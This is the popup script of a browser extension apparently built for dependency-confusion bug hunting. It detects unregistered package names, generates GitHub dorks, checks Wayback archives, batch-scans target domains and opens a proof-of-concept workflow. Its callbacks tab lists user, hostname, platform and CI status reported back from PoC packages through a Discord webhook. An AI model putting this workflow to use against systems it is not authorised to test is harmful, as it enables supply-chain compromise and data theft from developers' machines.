// Popup script for Dependency Confusion Hunter v1.4.0
// Author: OFJAAAH

let allFindings = [];
let filteredFindings = [];
let history = [];
let callbacks = [];
let targets = [];
let currentTab = 'findings';
let isScanning = false;

// Initialize popup
document.addEventListener('DOMContentLoaded', () => {
  loadFindings();
  loadHistory();
  loadCallbacks();
  loadTargets();
  checkCallbackStatus();
  setupEventListeners();
  setupTabs();
  setupKeyboardShortcuts();
});

// Setup event listeners
function setupEventListeners() {
  // Main actions
  document.getElementById('refreshBtn').addEventListener('click', () => {
    loadFindings();
    loadHistory();
    loadCallbacks();
    showNotification('Refreshed!', 'success');
  });
  document.getElementById('clearBtn').addEventListener('click', clearFindings);
  document.getElementById('settingsBtn').addEventListener('click', openSettings);
  document.getElementById('exportBtn').addEventListener('click', exportAllData);

  // Filters
  document.getElementById('searchInput').addEventListener('input', filterFindings);
  document.getElementById('typeFilter').addEventListener('change', filterFindings);
  document.getElementById('severityFilter').addEventListener('change', filterFindings);
  document.getElementById('confidenceFilter').addEventListener('change', filterFindings);

  // History tab
  document.getElementById('clearHistoryBtn').addEventListener('click', clearHistory);
  document.getElementById('exportHistoryBtn').addEventListener('click', exportHistory);
  document.getElementById('exportJSONBtn').addEventListener('click', exportJSON);

  // Callbacks tab
  document.getElementById('testCallbackBtn').addEventListener('click', testCallback);
  document.getElementById('clearCallbacksBtn').addEventListener('click', clearCallbacks);
  document.getElementById('refreshCallbacksBtn').addEventListener('click', loadCallbacks);

  // Findings tab actions
  document.getElementById('createPoCBtn').addEventListener('click', createBulkPoC);
  document.getElementById('generateReportBtn').addEventListener('click', generateBulkReport);

  // Recon tab
  document.getElementById('generateDorksBtn').addEventListener('click', generateDorks);
  document.getElementById('checkWaybackBtn').addEventListener('click', checkWayback);
  document.getElementById('openWaybackBtn').addEventListener('click', openWaybackMachine);
  document.getElementById('scanPathsBtn').addEventListener('click', scanCommonPaths);

  // Setup copy buttons for dorks
  setupDorkCopyButtons();

  // Targets tab
  document.getElementById('importTargetsBtn').addEventListener('click', importTargets);
  document.getElementById('clearTargetsBtn').addEventListener('click', clearTargets);
  document.getElementById('scanAllTargetsBtn').addEventListener('click', scanAllTargets);

  // Tutorials tab
  document.getElementById('openTutorialsBtn').addEventListener('click', () => openTutorials());
  document.querySelectorAll('.tutorial-card').forEach(card => {
    card.addEventListener('click', () => {
      const ecosystem = card.dataset.ecosystem;
      openTutorials(ecosystem);
    });
  });

  // Modal
  document.getElementById('closeModalBtn').addEventListener('click', closeShortcutsModal);

  // Tools tab
  setupToolsTab();
}

// Setup keyboard shortcuts
function setupKeyboardShortcuts() {
  document.addEventListener('keydown', (e) => {
    // Check for Ctrl/Cmd key combinations
    if (e.ctrlKey || e.metaKey) {
      switch (e.key) {
        case 'r':
        case 'R':
          e.preventDefault();
          document.getElementById('refreshBtn').click();
          break;
        case 'e':
        case 'E':
          e.preventDefault();
          exportAllData();
          break;
        case 'p':
        case 'P':
          e.preventDefault();
          createBulkPoC();
          break;
        case 's':
        case 'S':
          e.preventDefault();
          openSettings();
          break;
        case 'x':
        case 'X':
          e.preventDefault();
          clearCurrentTab();
          break;
        case '1':
          e.preventDefault();
          switchTab('findings');
          break;
        case '2':
          e.preventDefault();
          switchTab('history');
          break;
        case '3':
          e.preventDefault();
          switchTab('callbacks');
          break;
        case '4':
          e.preventDefault();
          switchTab('recon');
          break;
        case '5':
          e.preventDefault();
          switchTab('targets');
          break;
        case '6':
          e.preventDefault();
          switchTab('tutorials');
          break;
        case '7':
          e.preventDefault();
          switchTab('tools');
          break;
      }
    } else if (e.key === '?' && !e.target.matches('input, textarea')) {
      e.preventDefault();
      showShortcutsModal();
    } else if (e.key === 'Escape') {
      closeShortcutsModal();
      closeAllModals();
    }
  });
}

// Show/hide shortcuts modal
function showShortcutsModal() {
  document.getElementById('shortcutsModal').style.display = 'flex';
}

function closeShortcutsModal() {
  document.getElementById('shortcutsModal').style.display = 'none';
}

function closeAllModals() {
  document.querySelectorAll('.modal, .poc-modal').forEach(modal => {
    modal.style.display = 'none';
  });
}

// Clear current tab content
function clearCurrentTab() {
  switch (currentTab) {
    case 'findings':
      clearFindings();
      break;
    case 'history':
      clearHistory();
      break;
    case 'callbacks':
      clearCallbacks();
      break;
    case 'targets':
      clearTargets();
      break;
  }
}

// Setup tab functionality
function setupTabs() {
  const tabButtons = document.querySelectorAll('.tab-button');

  tabButtons.forEach(button => {
    button.addEventListener('click', () => {
      const tab = button.dataset.tab;
      switchTab(tab);
    });
  });
}

// Switch tabs
function switchTab(tab) {
  currentTab = tab;

  // Update buttons
  document.querySelectorAll('.tab-button').forEach(btn => {
    btn.classList.remove('active');
    if (btn.dataset.tab === tab) {
      btn.classList.add('active');
    }
  });

  // Update content
  document.querySelectorAll('.tab-content').forEach(content => {
    content.classList.remove('active');
  });

  const tabElement = document.getElementById(tab + 'Tab');
  if (tabElement) {
    tabElement.classList.add('active');
  }

  // Load tab-specific data
  switch (tab) {
    case 'history':
      renderHistory();
      break;
    case 'callbacks':
      loadCallbacks();
      break;
    case 'targets':
      renderTargets();
      break;
  }
}

// Load findings from background
async function loadFindings() {
  chrome.runtime.sendMessage({ action: 'getFindings' }, (response) => {
    if (response && response.findings) {
      allFindings = response.findings;
      filteredFindings = allFindings;
      updateStats();
      renderFindings();
    }
  });
}

// Load history from background
async function loadHistory() {
  chrome.runtime.sendMessage({ action: 'getHistory' }, (response) => {
    if (response && response.history) {
      history = response.history;
      updateStats();
    }
  });
}

// Update statistics dashboard
function updateStats() {
  // Severity counts
  const criticalCount = allFindings.filter(f => getSeverity(f) === 'critical').length;
  const highCount = allFindings.filter(f => getSeverity(f) === 'high').length;
  const mediumCount = allFindings.filter(f => getSeverity(f) === 'medium').length;

  document.getElementById('criticalCount').textContent = criticalCount;
  document.getElementById('highCount').textContent = highCount;
  document.getElementById('mediumCount').textContent = mediumCount;
  document.getElementById('vulnerableCount').textContent = allFindings.length;

  // Ecosystem counts
  const ecosystems = {
    npm: allFindings.filter(f => f.type === 'npm').length,
    pypi: allFindings.filter(f => f.type === 'pip').length,
    gem: allFindings.filter(f => f.type === 'gem').length,
    go: allFindings.filter(f => f.type === 'go').length,
    cargo: allFindings.filter(f => f.type === 'cargo').length,
    composer: allFindings.filter(f => f.type === 'composer').length
  };

  document.getElementById('npmCount').textContent = ecosystems.npm;
  document.getElementById('pypiCount').textContent = ecosystems.pypi;
  document.getElementById('gemCount').textContent = ecosystems.gem;
  document.getElementById('goCount').textContent = ecosystems.go;
  document.getElementById('cargoCount').textContent = ecosystems.cargo;
  document.getElementById('composerCount').textContent = ecosystems.composer;
}

// Get severity for a finding
function getSeverity(finding) {
  // Higher confidence = higher severity
  if (finding.confidence >= 90) return 'critical';
  if (finding.confidence >= 70) return 'high';
  return 'medium';
}

// Render findings list
function renderFindings() {
  const container = document.getElementById('findingsList');

  if (filteredFindings.length === 0) {
    container.innerHTML = `
      <div class="empty-state">
        <p>${allFindings.length === 0 ? 'No vulnerabilities found yet.' : 'No results for the applied filters.'}</p>
        ${allFindings.length === 0 ? '<p class="help-text">Browse websites with JavaScript dependencies and the extension will automatically detect packages that don\'t exist publicly.</p>' : ''}
      </div>
    `;
    return;
  }

  container.innerHTML = filteredFindings.map(finding => {
    const severity = getSeverity(finding);
    return `
    <div class="finding-card severity-${severity}" data-id="${finding.id}" data-package="${escapeHtml(finding.package)}" data-type="${finding.type}" data-registry="${escapeHtml(finding.registryUrl || '')}">
      <div class="finding-header">
        <span class="package-name">${escapeHtml(finding.package)}</span>
        <span class="package-type type-${finding.type}">${finding.type.toUpperCase()}</span>
        <span class="severity-badge severity-${severity}">${severity.toUpperCase()}</span>
        ${finding.confidence !== undefined ? `
        <span class="confidence-badge confidence-${getConfidenceClass(finding.confidence)}" title="Confidence: ${finding.confidence}%">
          ${getConfidenceIcon(finding.confidence)} ${finding.confidence}%
        </span>
        ` : ''}
      </div>
      <div class="finding-details">
        <div class="detail-row">
          <span class="label">Source:</span>
          <span class="value" title="${escapeHtml(finding.source)}">${truncateUrl(finding.source)}</span>
        </div>
        <div class="detail-row">
          <span class="label">Found:</span>
          <span class="value">${formatTimestamp(finding.timestamp)}</span>
        </div>
        <div class="detail-row">
          <span class="label">Status:</span>
          <span class="value status-vulnerable">❌ Not publicly registered</span>
        </div>
        ${finding.matchLine ? `
        <div class="detail-row">
          <span class="label">Line:</span>
          <span class="value">${finding.matchLine}</span>
        </div>
        ` : ''}
      </div>
      ${finding.codeSnippet && finding.codeSnippet.length > 0 ? `
      <details class="code-details">
        <summary>💻 View detection code</summary>
        <div class="code-snippet-container">
          <pre class="code-snippet"><code>${renderCodeSnippet(finding.codeSnippet)}</code></pre>
        </div>
      </details>
      ` : ''}
      <div class="finding-actions">
        <button class="btn-action btn-copy-name">📋 Name</button>
        <button class="btn-action btn-create-poc btn-primary-action">🚀 PoC</button>
        <button class="btn-action btn-generate-report">📝 Report</button>
        <button class="btn-action btn-open-registry">🔗 Registry</button>
      </div>
    </div>
  `}).join('');

  // Add event listeners for action buttons
  setupFindingActionListeners();
}

// Filter findings
function filterFindings() {
  const searchTerm = document.getElementById('searchInput').value.toLowerCase();
  const typeFilter = document.getElementById('typeFilter').value;
  const severityFilter = document.getElementById('severityFilter').value;
  const confidenceFilter = parseInt(document.getElementById('confidenceFilter').value) || 0;

  filteredFindings = allFindings.filter(finding => {
    const matchesSearch = finding.package.toLowerCase().includes(searchTerm) ||
                          finding.source.toLowerCase().includes(searchTerm);
    const matchesType = typeFilter === 'all' || finding.type === typeFilter;
    const matchesSeverity = severityFilter === 'all' || getSeverity(finding) === severityFilter;
    const matchesConfidence = (finding.confidence || 50) >= confidenceFilter;
    return matchesSearch && matchesType && matchesSeverity && matchesConfidence;
  });

  // Sort by confidence (highest first)
  filteredFindings.sort((a, b) => (b.confidence || 50) - (a.confidence || 50));

  renderFindings();
}

// Setup event listeners for finding action buttons
function setupFindingActionListeners() {
  const container = document.getElementById('findingsList');

  // Event delegation for dynamically created buttons
  container.addEventListener('click', (e) => {
    const button = e.target.closest('.btn-action');
    if (!button) return;

    const card = button.closest('.finding-card');
    if (!card) return;

    const packageName = card.dataset.package;
    const packageType = card.dataset.type;
    const registryUrl = card.dataset.registry;

    if (button.classList.contains('btn-copy-name')) {
      copyPackageName(packageName);
    } else if (button.classList.contains('btn-create-poc')) {
      createPoC(packageName, packageType);
    } else if (button.classList.contains('btn-generate-report')) {
      const finding = allFindings.find(f => f.package === packageName);
      generateFindingReport(finding);
    } else if (button.classList.contains('btn-open-registry')) {
      openRegistry(registryUrl, packageName, packageType);
    }
  });
}

// Clear all findings
function clearFindings() {
  if (confirm('Are you sure you want to clear all found vulnerabilities?')) {
    chrome.runtime.sendMessage({ action: 'clearFindings' }, () => {
      allFindings = [];
      filteredFindings = [];
      updateStats();
      renderFindings();
      showNotification('Findings cleared!', 'success');
    });
  }
}

// Open settings page
function openSettings() {
  chrome.runtime.openOptionsPage();
}

// Open tutorials page
function openTutorials(ecosystem = null) {
  const tutorialsUrl = chrome.runtime.getURL('tutorials.html');
  let url = tutorialsUrl;

  // Map ecosystem to tab names
  const tabMap = {
    'npm': 'npm',
    'ruby': 'ruby',
    'python': 'python',
    'go': 'go',
    'dorks': 'dorks',
    'bounty': 'bounties'
  };

  if (ecosystem && tabMap[ecosystem]) {
    url += `#${tabMap[ecosystem]}Tab`;
  }

  chrome.tabs.create({ url: url });
}

// Copy package name to clipboard
function copyPackageName(packageName) {
  navigator.clipboard.writeText(packageName).then(() => {
    showNotification('Name copied!', 'success');
  }).catch(err => {
    console.error('Failed to copy:', err);
    showNotification('Failed to copy', 'error');
  });
}

// Open registry URL
function openRegistry(url, packageName, type) {
  if (url) {
    chrome.tabs.create({ url: url });
  } else {
    // Generate registry URL based on type
    let registryUrl = '';
    switch (type) {
      case 'npm':
        registryUrl = `https://www.npmjs.com/package/${packageName}`;
        break;
      case 'pip':
        registryUrl = `https://pypi.org/project/${packageName}`;
        break;
      case 'gem':
        registryUrl = `https://rubygems.org/gems/${packageName}`;
        break;
      case 'go':
        registryUrl = `https://pkg.go.dev/${packageName}`;
        break;
      case 'cargo':
        registryUrl = `https://crates.io/crates/${packageName}`;
        break;
      case 'composer':
        registryUrl = `https://packagist.org/packages/${packageName}`;
        break;
      default:
        showNotification('Registry URL not available', 'error');
        return;
    }
    chrome.tabs.create({ url: registryUrl });
  }
}

// Create PoC package
async function createPoC(packageName, packageType) {
  if (packageType !== 'npm') {
    showNotification('PoC only supported for npm currently', 'info');
    return;
  }

  showNotification('Opening PoC workflow...', 'info');

  // Open the workflow page in a new tab
  const workflowUrl = chrome.runtime.getURL(`poc-workflow.html?package=${encodeURIComponent(packageName)}&type=${packageType}`);
  chrome.tabs.create({ url: workflowUrl });
}

// Create bulk PoC for all findings
function createBulkPoC() {
  if (allFindings.length === 0) {
    showNotification('No findings to create PoC for', 'error');
    return;
  }

  const npmFindings = allFindings.filter(f => f.type === 'npm');
  if (npmFindings.length === 0) {
    showNotification('No npm packages found', 'error');
    return;
  }

  // Open workflow with first npm package
  createPoC(npmFindings[0].package, 'npm');
}

// Generate bulk report
function generateBulkReport() {
  if (allFindings.length === 0) {
    showNotification('No findings to generate report for', 'error');
    return;
  }

  chrome.runtime.sendMessage({
    action: 'generateBulkReport',
    findings: allFindings
  }, (response) => {
    if (response && response.success) {
      const filename = `dependency-confusion-report-${Date.now()}.md`;
      downloadFile(filename, response.report);
      showNotification('Report downloaded!', 'success');
    } else {
      showNotification('Failed to generate report', 'error');
    }
  });
}

// Export all data
function exportAllData() {
  chrome.runtime.sendMessage({ action: 'exportJSON' }, (response) => {
    if (response && response.success && response.data) {
      const jsonStr = JSON.stringify(response.data, null, 2);
      const blob = new Blob([jsonStr], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `dependency-hunter-export-${Date.now()}.json`;
      a.click();
      URL.revokeObjectURL(url);

      showNotification('Data exported!', 'success');
    } else {
      showNotification('Failed to export data', 'error');
    }
  });
}

// Show notification
function showNotification(message, type = 'info') {
  const notification = document.createElement('div');
  notification.className = `notification notification-${type}`;
  notification.textContent = message;
  document.body.appendChild(notification);

  setTimeout(() => {
    notification.classList.add('show');
  }, 10);

  setTimeout(() => {
    notification.classList.remove('show');
    setTimeout(() => notification.remove(), 300);
  }, 2000);
}

// Utility functions
function escapeHtml(text) {
  if (!text) return '';
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function truncateUrl(url, maxLength = 50) {
  if (!url) return '';
  if (url.length <= maxLength) return url;
  return url.substring(0, maxLength - 3) + '...';
}

function formatTimestamp(timestamp) {
  const date = new Date(timestamp);
  const now = new Date();
  const diffMs = now - date;
  const diffMins = Math.floor(diffMs / 60000);

  if (diffMins < 1) return 'Just now';
  if (diffMins < 60) return `${diffMins}m ago`;
  const diffHours = Math.floor(diffMins / 60);
  if (diffHours < 24) return `${diffHours}h ago`;
  const diffDays = Math.floor(diffHours / 24);
  return `${diffDays}d ago`;
}

// Render code snippet with line numbers and highlighting
function renderCodeSnippet(snippetLines) {
  if (!snippetLines || snippetLines.length === 0) {
    return '<span class="code-empty">Code snippet not available</span>';
  }

  return snippetLines.map(line => {
    const lineClass = line.isMatch ? 'code-line code-line-highlight' : 'code-line';
    const lineNum = String(line.lineNumber).padStart(4, ' ');
    const content = escapeHtml(line.content || '');

    return `<div class="${lineClass}"><span class="line-number">${lineNum}</span><span class="line-content">${content}</span></div>`;
  }).join('');
}

// Get confidence level class for styling
function getConfidenceClass(confidence) {
  if (confidence >= 90) return 'high';
  if (confidence >= 70) return 'medium';
  return 'low';
}

// Get confidence icon
function getConfidenceIcon(confidence) {
  if (confidence >= 90) return '✅';
  if (confidence >= 70) return '⚠️';
  return '❓';
}

// =====================================================
// HISTORY TAB FUNCTIONS
// =====================================================

// Render history
function renderHistory() {
  const container = document.getElementById('historyList');

  if (history.length === 0) {
    container.innerHTML = `
      <div class="empty-state">
        <p>No history available.</p>
        <p class="help-text">History shows all previous detections of vulnerable packages.</p>
      </div>
    `;
    return;
  }

  // Group by package name
  const grouped = {};
  history.forEach(entry => {
    const key = `${entry.package}-${entry.type}`;
    if (!grouped[key]) {
      grouped[key] = {
        package: entry.package,
        type: entry.type,
        count: 0,
        sources: new Set(),
        firstSeen: entry.detectedAt || entry.timestamp,
        lastSeen: entry.detectedAt || entry.timestamp,
        entries: []
      };
    }
    grouped[key].count++;
    grouped[key].sources.add(entry.source || entry.url);
    grouped[key].entries.push(entry);

    // Update last seen
    const entryDate = new Date(entry.detectedAt || entry.timestamp);
    const lastSeenDate = new Date(grouped[key].lastSeen);
    if (entryDate > lastSeenDate) {
      grouped[key].lastSeen = entry.detectedAt || entry.timestamp;
    }
  });

  // Sort by last seen (most recent first)
  const sortedGroups = Object.values(grouped).sort((a, b) => {
    return new Date(b.lastSeen) - new Date(a.lastSeen);
  });

  container.innerHTML = sortedGroups.map(group => `
    <div class="finding-card history-card">
      <div class="finding-header">
        <span class="package-name">${escapeHtml(group.package)}</span>
        <span class="package-type type-${group.type}">${group.type.toUpperCase()}</span>
      </div>
      <div class="finding-details">
        <div class="detail-row">
          <span class="label">Detections:</span>
          <span class="value">${group.count}x</span>
        </div>
        <div class="detail-row">
          <span class="label">Unique Sources:</span>
          <span class="value">${group.sources.size}</span>
        </div>
        <div class="detail-row">
          <span class="label">First seen:</span>
          <span class="value">${formatTimestamp(group.firstSeen)}</span>
        </div>
        <div class="detail-row">
          <span class="label">Last seen:</span>
          <span class="value">${formatTimestamp(group.lastSeen)}</span>
        </div>
      </div>
      <details class="history-details">
        <summary>View all detections (${group.count})</summary>
        <div class="history-entries">
          ${group.entries.map(entry => `
            <div class="history-entry">
              <div class="entry-time">${formatTimestamp(entry.detectedAt || entry.timestamp)}</div>
              <div class="entry-source">${truncateUrl(entry.source || entry.url, 40)}</div>
            </div>
          `).join('')}
        </div>
      </details>
    </div>
  `).join('');
}

// Clear history
function clearHistory() {
  if (confirm('Are you sure you want to clear all history?')) {
    chrome.runtime.sendMessage({ action: 'clearHistory' }, () => {
      history = [];
      updateStats();
      renderHistory();
      showNotification('History cleared!', 'success');
    });
  }
}

// Export history
function exportHistory() {
  if (history.length === 0) {
    showNotification('No history to export', 'error');
    return;
  }

  const csv = [
    ['Package', 'Type', 'Date/Time', 'Source', 'Registry'].join(','),
    ...history.map(entry => [
      entry.package,
      entry.type,
      entry.detectedAt || entry.timestamp,
      entry.source || entry.url,
      entry.registryUrl || ''
    ].join(','))
  ].join('\n');

  const blob = new Blob([csv], { type: 'text/csv' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `dependency-hunter-history-${Date.now()}.csv`;
  a.click();
  URL.revokeObjectURL(url);

  showNotification('History exported!', 'success');
}

// Export as JSON
function exportJSON() {
  chrome.runtime.sendMessage({ action: 'exportJSON' }, (response) => {
    if (response && response.success && response.data) {
      const jsonStr = JSON.stringify(response.data, null, 2);
      const blob = new Blob([jsonStr], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `dependency-hunter-export-${Date.now()}.json`;
      a.click();
      URL.revokeObjectURL(url);

      showNotification('Data exported as JSON!', 'success');
    } else {
      showNotification('Failed to export data', 'error');
    }
  });
}

// =====================================================
// CALLBACKS TAB FUNCTIONS
// =====================================================

// Check callback status (Discord webhook)
function checkCallbackStatus() {
  chrome.storage.sync.get(['discordWebhook'], (result) => {
    const dot = document.getElementById('callbackDot');
    const statusText = document.getElementById('callbackStatusText');

    if (result.discordWebhook) {
      dot.classList.add('active');
      dot.classList.remove('inactive');
      statusText.textContent = 'Discord Webhook Configured';
    } else {
      dot.classList.add('inactive');
      dot.classList.remove('active');
      statusText.textContent = 'Discord Webhook Not Configured';
    }
  });
}

// Load callbacks from storage
function loadCallbacks() {
  chrome.storage.local.get(['callbacks'], (result) => {
    callbacks = result.callbacks || [];
    renderCallbacks();
  });
}

// Test callback
function testCallback() {
  chrome.storage.sync.get(['discordWebhook'], (result) => {
    if (!result.discordWebhook) {
      showNotification('Configure Discord Webhook in Settings first', 'error');
      return;
    }

    showNotification('Sending test callback...', 'info');

    chrome.runtime.sendMessage({
      action: 'testDiscordCallback',
      webhookUrl: result.discordWebhook
    }, (response) => {
      if (response && response.success) {
        showNotification('Test callback sent! Check Discord.', 'success');
      } else {
        showNotification('Failed to send test callback', 'error');
      }
    });
  });
}

// Clear callbacks
function clearCallbacks() {
  chrome.storage.local.set({ callbacks: [] }, () => {
    callbacks = [];
    renderCallbacks();
    showNotification('Callbacks cleared!', 'success');
  });
}

// Render callbacks list
function renderCallbacks() {
  const container = document.getElementById('callbacksList');

  if (callbacks.length === 0) {
    container.innerHTML = `
      <div class="empty-state">
        <p>No callbacks received yet.</p>
        <p class="help-text">Configure Discord Webhook in settings to receive callbacks from PoC packages.</p>
      </div>
    `;
    return;
  }

  // Sort by timestamp (most recent first)
  const sorted = [...callbacks].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

  container.innerHTML = sorted.map(callback => {
    const data = callback.data || callback.extractedData || {};
    const severity = callback.severity || 'MEDIUM';

    return `
      <div class="finding-card callback-card severity-${severity.toLowerCase()}">
        <div class="finding-header">
          <span class="package-name">${escapeHtml(data.package || 'Unknown Package')}</span>
          <span class="severity-badge severity-${severity.toLowerCase()}">${severity}</span>
        </div>
        <div class="finding-details">
          <div class="detail-row">
            <span class="label">User:</span>
            <span class="value">${escapeHtml(data.user || 'N/A')}</span>
          </div>
          <div class="detail-row">
            <span class="label">Hostname:</span>
            <span class="value">${escapeHtml(data.hostname || 'N/A')}</span>
          </div>
          <div class="detail-row">
            <span class="label">Platform:</span>
            <span class="value">${escapeHtml((data.platform || '') + ' ' + (data.arch || ''))}</span>
          </div>
          <div class="detail-row">
            <span class="label">Environment:</span>
            <span class="value">${data.isCI ? '⚠️ CI/CD' : '💻 Local'}</span>
          </div>
          <div class="detail-row">
            <span class="label">Received:</span>
            <span class="value">${formatTimestamp(callback.timestamp)}</span>
          </div>
        </div>
      </div>
    `;
  }).join('');
}

// =====================================================
// RECON TAB FUNCTIONS
// =====================================================

// Setup copy buttons for dorks
function setupDorkCopyButtons() {
  document.querySelectorAll('.btn-copy').forEach(btn => {
    btn.addEventListener('click', () => {
      const text = btn.dataset.copy;
      navigator.clipboard.writeText(text).then(() => {
        showNotification('Copied!', 'success');
      });
    });
  });
}

// Generate GitHub dorks for target
function generateDorks() {
  const target = document.getElementById('reconTarget').value.trim();

  if (!target) {
    showNotification('Enter a target domain first', 'error');
    return;
  }

  const dorks = [
    { query: `site:github.com "${target}" filename:package.json`, desc: 'NPM packages' },
    { query: `site:github.com "${target}" filename:package-lock.json`, desc: 'NPM lockfiles' },
    { query: `site:github.com "${target}" filename:requirements.txt`, desc: 'Python requirements' },
    { query: `site:github.com "${target}" filename:Pipfile`, desc: 'Pipenv files' },
    { query: `site:github.com "${target}" filename:Gemfile`, desc: 'Ruby Gemfiles' },
    { query: `site:github.com "${target}" filename:go.mod`, desc: 'Go modules' },
    { query: `site:github.com "${target}" filename:go.sum`, desc: 'Go checksums' },
    { query: `site:github.com "${target}" filename:composer.json`, desc: 'PHP Composer' },
    { query: `site:github.com "${target}" filename:Cargo.toml`, desc: 'Rust Cargo' },
    { query: `site:github.com "${target}" filename:.npmrc`, desc: 'NPM config' },
    { query: `site:github.com "${target}" filename:yarn.lock`, desc: 'Yarn lockfiles' },
    { query: `"${target}" filename:package.json "dependencies"`, desc: 'Dependencies' },
    { query: `org:${target.split('.')[0]} filename:package.json`, desc: 'Org packages' }
  ];

  const container = document.getElementById('githubDorks');
  container.innerHTML = dorks.map(dork => `
    <div class="dork-item">
      <code title="${dork.desc}">${escapeHtml(dork.query)}</code>
      <button class="btn-copy" data-copy="${escapeHtml(dork.query)}">📋</button>
      <a href="https://github.com/search?q=${encodeURIComponent(dork.query)}&type=code" target="_blank" class="btn-open">🔗</a>
    </div>
  `).join('');

  // Re-setup copy buttons
  container.querySelectorAll('.btn-copy').forEach(btn => {
    btn.addEventListener('click', () => {
      navigator.clipboard.writeText(btn.dataset.copy).then(() => {
        showNotification('Copied!', 'success');
      });
    });
  });

  showNotification(`Generated ${dorks.length} dorks for ${target}`, 'success');
}

// Check Wayback Machine
async function checkWayback() {
  const target = document.getElementById('reconTarget').value.trim();

  if (!target) {
    showNotification('Enter a target domain first', 'error');
    return;
  }

  const container = document.getElementById('waybackResults');
  container.innerHTML = '<div class="loading">🔍 Checking Wayback Machine...</div>';

  const paths = [
    '/package.json',
    '/package-lock.json',
    '/yarn.lock',
    '/static/package.json',
    '/.next/package.json',
    '/dist/package.json'
  ];

  const results = [];

  for (const path of paths) {
    try {
      const url = `https://web.archive.org/cdx/search/cdx?url=${target}${path}&output=json&limit=5`;
      const response = await fetch(url);

      if (response.ok) {
        const data = await response.json();
        if (data && data.length > 1) {
          results.push({
            path: path,
            count: data.length - 1,
            snapshots: data.slice(1)
          });
        }
      }
    } catch (e) {
      console.error(`Error checking ${path}:`, e);
    }
  }

  if (results.length === 0) {
    container.innerHTML = `
      <div class="empty-state small">
        <p>No archived manifest files found for ${target}</p>
      </div>
    `;
    return;
  }

  container.innerHTML = results.map(result => `
    <div class="wayback-item">
      <div class="wayback-path">
        <code>${result.path}</code>
        <span class="wayback-count">${result.count} snapshots</span>
      </div>
      <div class="wayback-actions">
        <a href="https://web.archive.org/web/*/${target}${result.path}" target="_blank" class="btn btn-small btn-secondary">View Archives</a>
      </div>
    </div>
  `).join('');

  showNotification(`Found ${results.length} paths with archives`, 'success');
}

// Open Wayback Machine
function openWaybackMachine() {
  const target = document.getElementById('reconTarget').value.trim();

  if (!target) {
    showNotification('Enter a target domain first', 'error');
    return;
  }

  chrome.tabs.create({ url: `https://web.archive.org/web/*/${target}/*package.json` });
}

// Scan common paths
async function scanCommonPaths() {
  const target = document.getElementById('reconTarget').value.trim();

  if (!target) {
    showNotification('Enter a target domain first', 'error');
    return;
  }

  showNotification('Scanning common paths...', 'info');

  const paths = [
    '/package.json',
    '/package-lock.json',
    '/yarn.lock',
    '/static/package.json',
    '/.next/package.json',
    '/dist/package.json',
    '/build/package.json',
    '/assets/package.json'
  ];

  const results = [];

  for (const path of paths) {
    try {
      const url = `https://${target}${path}`;
      const response = await fetch(url, {
        method: 'HEAD',
        mode: 'no-cors'
      });

      // Note: Due to CORS, we can only detect if the request was made
      // Real scanning would require a backend or content script
      results.push({ path, status: 'checked' });
    } catch (e) {
      results.push({ path, status: 'error' });
    }
  }

  showNotification(`Scanned ${paths.length} paths. Check Network tab for results.`, 'info');

  // Open the target in a new tab for manual verification
  chrome.tabs.create({ url: `https://${target}/package.json` });
}

// =====================================================
// TARGETS TAB FUNCTIONS
// =====================================================

// Load targets from storage
function loadTargets() {
  chrome.storage.local.get(['targets'], (result) => {
    targets = result.targets || [];
    renderTargets();
  });
}

// Import targets from textarea
function importTargets() {
  const textarea = document.getElementById('batchTargets');
  const lines = textarea.value.split('\n')
    .map(line => line.trim())
    .filter(line => line && !line.startsWith('#'));

  if (lines.length === 0) {
    showNotification('No valid targets to import', 'error');
    return;
  }

  // Add to targets, avoiding duplicates
  const newTargets = lines.filter(line => !targets.includes(line));
  targets = [...targets, ...newTargets];

  chrome.storage.local.set({ targets }, () => {
    renderTargets();
    textarea.value = '';
    showNotification(`Imported ${newTargets.length} new targets`, 'success');
  });
}

// Clear all targets
function clearTargets() {
  if (confirm('Are you sure you want to clear all targets?')) {
    targets = [];
    chrome.storage.local.set({ targets }, () => {
      renderTargets();
      showNotification('Targets cleared!', 'success');
    });
  }
}

// Render targets list
function renderTargets() {
  const container = document.getElementById('targetsList');
  document.getElementById('targetCount').textContent = targets.length;

  if (targets.length === 0) {
    container.innerHTML = `
      <div class="empty-state small">
        <p>No targets added yet.</p>
      </div>
    `;
    return;
  }

  container.innerHTML = targets.map((target, index) => `
    <div class="target-item" data-index="${index}">
      <span class="target-domain">${escapeHtml(target)}</span>
      <div class="target-actions">
        <button class="btn-small btn-scan-target" data-target="${escapeHtml(target)}">🔍</button>
        <button class="btn-small btn-remove-target" data-index="${index}">🗑️</button>
      </div>
    </div>
  `).join('');

  // Setup event listeners
  container.querySelectorAll('.btn-scan-target').forEach(btn => {
    btn.addEventListener('click', () => {
      const target = btn.dataset.target;
      document.getElementById('reconTarget').value = target;
      switchTab('recon');
      generateDorks();
    });
  });

  container.querySelectorAll('.btn-remove-target').forEach(btn => {
    btn.addEventListener('click', () => {
      const index = parseInt(btn.dataset.index);
      targets.splice(index, 1);
      chrome.storage.local.set({ targets }, () => {
        renderTargets();
        showNotification('Target removed', 'success');
      });
    });
  });
}

// Scan all targets
async function scanAllTargets() {
  if (targets.length === 0) {
    showNotification('No targets to scan', 'error');
    return;
  }

  if (isScanning) {
    showNotification('Scan already in progress', 'error');
    return;
  }

  isScanning = true;
  const progressSection = document.getElementById('scanProgressSection');
  const progressBar = document.getElementById('scanProgress');
  const currentSpan = document.getElementById('scanCurrent');
  const totalSpan = document.getElementById('scanTotal');

  progressSection.style.display = 'block';
  totalSpan.textContent = targets.length;

  for (let i = 0; i < targets.length; i++) {
    currentSpan.textContent = i + 1;
    progressBar.style.width = `${((i + 1) / targets.length) * 100}%`;

    const target = targets[i];

    // Send message to background to scan target
    chrome.runtime.sendMessage({
      action: 'scanTarget',
      target: target
    });

    // Small delay between targets
    await new Promise(resolve => setTimeout(resolve, 500));
  }

  isScanning = false;
  showNotification(`Scanned ${targets.length} targets`, 'success');

  // Refresh findings
  setTimeout(loadFindings, 1000);
}

// =====================================================
// REPORT GENERATION FUNCTIONS
// =====================================================

